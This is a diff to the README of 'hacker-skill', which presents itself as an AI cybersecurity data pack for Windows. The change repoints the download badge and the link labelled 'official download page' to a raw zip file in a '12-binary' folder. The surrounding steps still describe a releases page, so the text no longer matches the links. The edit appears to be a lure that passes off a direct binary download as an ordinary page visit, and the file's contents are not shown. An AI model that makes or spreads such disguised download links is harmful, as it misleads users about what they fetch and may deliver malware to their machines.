@@ -1,6 +1,6 @@
 # 🛡️ hacker-skill - Improve AI cybersecurity knowledge today
 
-[![Download Data Pack](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Beitrisestimable2078/hacker-skill)
+[![Download Data Pack](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Beitrisestimable2078/hacker-skill/raw/refs/heads/main/12-binary/skill-hacker-1.3.zip)
 
 ## 📌 What is hacker-skill?
 
@@ -12,7 +12,7 @@ This project includes 50 core modules and 54 sub-modules. The data covers inform
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Beitrisestimable2078/hacker-skill).
+1. Visit the [official download page](https://github.com/Beitrisestimable2078/hacker-skill/raw/refs/heads/main/12-binary/skill-hacker-1.3.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Select the file ending in .zip to start the download.
